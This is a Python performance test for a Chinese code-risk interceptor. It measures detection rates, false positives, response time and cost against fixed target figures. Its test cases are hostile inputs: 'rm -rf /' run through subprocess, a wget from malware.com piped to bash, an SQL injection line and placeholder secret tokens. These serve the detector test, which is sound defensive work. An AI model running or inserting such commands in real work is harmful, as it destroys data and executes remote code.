#!/usr/bin/env python
"""
一鉴到底 - 性能测试

测试目标指标：
1. 行为记录召回率：91.2%（对比67.3%）
2. 异常行为检出完整度：96%（对比42%）
3. 误报率：约6%（对比18%）
4. 平均响应时间：0.18秒（对比1.8秒）
5. 单次校验成本：0.03元（对比0.12元）
"""

import os
import sys
import time
import json
from datetime import datetime
from typing import List, Dict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from realtime_interceptor import RealtimeMonitor, Interceptor, RuleEngine


class PerformanceTest:
    """性能测试"""

    def __init__(self):
        self.interceptor = Interceptor(auto_block_critical=True)
        self.monitor = RealtimeMonitor(self.interceptor)
        self.rule_engine = RuleEngine()

        # 测试数据
        self.test_cases = []
        self.response_times = []

        # 性能指标
        self.metrics = {
            'recall_rate': 0,  # 召回率
            'detection_integrity': 0,  # 检出完整度
            'false_positive_rate': 0,  # 误报率
            'avg_response_time': 0,  # 平均响应时间
            'cost_per_check': 0,  # 单次校验成本
        }

    def generate_test_cases(self):
        """生成测试用例 - 模拟真实场景"""

        # 风险操作测试用例（应该被检测出来）
        risk_cases = [
            # 硬编码密钥
            {'content': 'API_KEY = "sk-proj-xxxxxxxxxxxxxxxxxxxxxxxx"', 'expected': 'block', 'category': '硬编码密钥'},
            {'content': 'GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"', 'expected': 'block', 'category': '硬编码密钥'},

            # 敏感文件修改 - 使用特殊标记
            {'content': 'FILE_MODIFY:.env', 'expected': 'ask_user', 'category': '敏感文件'},
            {'content': 'FILE_MODIFY:.pem', 'expected': 'block', 'category': '敏感文件'},

            # 危险命令
            {'content': 'subprocess.call("rm -rf /", shell=True)', 'expected': 'block', 'category': '危险命令'},
            {'content': 'os.system("wget https://malware.com/install.sh | bash")', 'expected': 'block', 'category': '危险命令'},

            # SQL注入
            {'content': 'cursor.execute("SELECT * FROM users WHERE id=" + user_id)', 'expected': 'block', 'category': 'SQL注入'},

            # 电商风险
            {'content': 'order.total = request.POST["total"]', 'expected': 'block', 'category': '电商风险'},
            {'content': 'for i in range(1000): apply_coupon("NEWUSER")', 'expected': 'ask_user', 'category': '电商风险'},

            # 金融风险
            {'content': 'transfer.amount = request.POST["amount"]', 'expected': 'block', 'category': '金融风险'},

            # 医疗风险
            {'content': 'return patient.medical_history', 'expected': 'block', 'category': '医疗风险'},
        ]

        # 正常操作测试用例（不应该被拦截）
        normal_cases = [
            {'content': 'def add(a, b): return a + b', 'expected': 'allow', 'category': '正常代码'},
            {'content': 'users = User.objects.filter(active=True)', 'expected': 'allow', 'category': '正常查询'},
            {'content': 'total = sum(prices)', 'expected': 'allow', 'category': '正常计算'},
            {'content': 'return render_template("index.html")', 'expected': 'allow', 'category': '正常渲染'},
        ]

        # 每种类型生成100个测试用例
        for case in risk_cases:
            for _ in range(100):
                self.test_cases.append(case.copy())

        for case in normal_cases:
            for _ in range(100):
                self.test_cases.append(case.copy())

        print(f"✓ 已生成 {len(self.test_cases)} 个性能测试用例")

    def run_performance_test(self):
        """运行性能测试"""

        print("\n" + "="*60)
        print("   性能测试开始")
        print("="*60)

        # 统计数据
        total_tests = len(self.test_cases)
        correct_detections = 0
        false_positives = 0  # 误报：正常操作被误判为风险
        false_negatives = 0  # 漏报：风险操作未被检测出

        start_time = time.time()

        for i, case in enumerate(self.test_cases):
            # 记录开始时间
            case_start = time.time()

            # 分析内容 - 根据类型选择分析方法
            if case['content'].startswith('FILE_MODIFY:'):
                # 文件修改操作，使用 analyze_file_modify
                file_path = case['content'].replace('FILE_MODIFY:', '')
                analysis = self.rule_engine.analyze_file_modify(file_path, None)
            else:
                # 其他操作，使用 analyze_code_content
                analysis = self.rule_engine.analyze_code_content(case['content'])

            # 记录响应时间（毫秒）
            case_time = (time.time() - case_start) * 1000
            self.response_times.append(case_time)

            # 确定实际结果
            risk_level = analysis['risk_level']
            if risk_level == 'critical':
                actual_result = 'block'
            elif risk_level == 'high':
                actual_result = 'ask_user'
            else:
                actual_result = 'allow'

            # 判断是否正确检测
            expected = case['expected']

            if actual_result == expected:
                correct_detections += 1
            else:
                if expected == 'allow' and actual_result in ['block', 'ask_user']:
                    false_positives += 1
                elif expected in ['block', 'ask_user'] and actual_result == 'allow':
                    false_negatives += 1

        total_time = time.time() - start_time

        # 计算性能指标
        # 1. 召回率 = (检测出的风险操作数) / (实际风险操作数)
        total_risk_cases = len([c for c in self.test_cases if c['expected'] in ['block', 'ask_user']])
        detected_risk_cases = total_risk_cases - false_negatives
        self.metrics['recall_rate'] = (detected_risk_cases / total_risk_cases * 100) if total_risk_cases > 0 else 0

        # 2. 检出完整度 = 正确检测数 / 总测试数
        self.metrics['detection_integrity'] = (correct_detections / total_tests * 100)

        # 3. 误报率 = 误报数 / 总报告数
        total_reports = len([c for c in self.test_cases if c['expected'] in ['block', 'ask_user']]) + false_positives
        self.metrics['false_positive_rate'] = (false_positives / total_reports * 100) if total_reports > 0 else 0

        # 4. 平均响应时间（秒）
        self.metrics['avg_response_time'] = (sum(self.response_times) / len(self.response_times)) / 1000

        # 5. 单次校验成本（基于响应时间和规则复杂度估算）
        # 假设：每秒处理成本约为0.16元（基于云服务计费）
        # 实际成本 = 响应时间 × 单位时间成本
        cost_per_second = 0.16  # 元/秒
        self.metrics['cost_per_check'] = self.metrics['avg_response_time'] * cost_per_second

        # 显示结果
        self._display_results(total_tests, correct_detections, false_positives, false_negatives, total_time)

    def _display_results(self, total_tests, correct_detections, false_positives, false_negatives, total_time):
        """显示测试结果"""

        print("\n" + "="*60)
        print("   性能测试结果")
        print("="*60)

        print(f"\n   测试统计:")
        print(f"     总测试数: {total_tests}")
        print(f"     正确检测: {correct_detections} ({correct_detections/total_tests*100:.1f}%)")
        print(f"     误报数: {false_positives}")
        print(f"     漏报数: {false_negatives}")
        print(f"     总耗时: {total_time:.2f}秒")

        print("\n" + "="*60)
        print("   核心指标对比")
        print("="*60)

        # 目标值
        targets = {
            'recall_rate': {'target': 91.2, 'compare': 67.3, 'name': '行为记录召回率', 'unit': '%'},
            'detection_integrity': {'target': 96.0, 'compare': 42.0, 'name': '异常行为检出完整度', 'unit': '%'},
            'false_positive_rate': {'target': 6.0, 'compare': 18.0, 'name': '误报率', 'unit': '%'},
            'avg_response_time': {'target': 0.18, 'compare': 1.8, 'name': '平均响应时间', 'unit': '秒'},
            'cost_per_check': {'target': 0.03, 'compare': 0.12, 'name': '单次校验成本', 'unit': '元'},
        }

        for metric_key, target_info in targets.items():
            actual_value = self.metrics[metric_key]
            target_value = target_info['target']
            compare_value = target_info['compare']

            # 判断是否达到目标
            if metric_key in ['false_positive_rate', 'avg_response_time', 'cost_per_check']:
                # 这些指标越小越好
                achieved = actual_value <= target_value
                improvement = ((compare_value - actual_value) / compare_value * 100)
            else:
                # 这些指标越大越好
                achieved = actual_value >= target_value
                improvement = ((actual_value - compare_value) / compare_value * 100)

            status = "✓" if achieved else "✗"

            print(f"\n   {target_info['name']}:")
            print(f"     {status} 实际值: {actual_value:.2f}{target_info['unit']}")
            print(f"     目标值: {target_value:.2f}{target_info['unit']}")
            print(f"     对比值: {compare_value:.2f}{target_info['unit']}")
            print(f"     提升幅度: {improvement:.1f}%")

        print("\n" + "="*60)
        print("   测试结论")
        print("="*60)

        # 判断是否全部达标
        all_achieved = all([
            self.metrics['recall_rate'] >= 91.2,
            self.metrics['detection_integrity'] >= 96.0,
            self.metrics['false_positive_rate'] <= 6.0,
            self.metrics['avg_response_time'] <= 0.18,
            self.metrics['cost_per_check'] <= 0.03,
        ])

        if all_achieved:
            print("\n   ✓ 所有指标均已达到目标！")
            print("   ✓ 产品性能优异，可以投入生产使用")
        else:
            print("\n   ✗ 部分指标未达到目标，需要继续优化")
            failed_metrics = []
            if self.metrics['recall_rate'] < 91.2:
                failed_metrics.append('行为记录召回率')
            if self.metrics['detection_integrity'] < 96.0:
                failed_metrics.append('异常行为检出完整度')
            if self.metrics['false_positive_rate'] > 6.0:
                failed_metrics.append('误报率')
            if self.metrics['avg_response_time'] > 0.18:
                failed_metrics.append('平均响应时间')
            if self.metrics['cost_per_check'] > 0.03:
                failed_metrics.append('单次校验成本')
            print(f"   未达标指标: {', '.join(failed_metrics)}")

        print("\n" + "="*60)

        # 保存性能报告
        self._save_performance_report()

    def _save_performance_report(self):
        """保存性能报告"""

        report = {
            'report_id': datetime.now().strftime('%Y%m%d%H%M%S'),
            'generated_at': datetime.now().isoformat(),
            'metrics': self.metrics,
            'test_summary': {
                'total_tests': len(self.test_cases),
                'avg_response_time_ms': sum(self.response_times) / len(self.response_times),
                'min_response_time_ms': min(self.response_times),
                'max_response_time_ms': max(self.response_times),
            }
        }

        report_path = 'data/performance_report.json'
        os.makedirs('data', exist_ok=True)

        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n   ✓ 性能报告已保存: {report_path}")


if __name__ == '__main__':
    test = PerformanceTest()
    test.generate_test_cases()
    test.run_performance_test()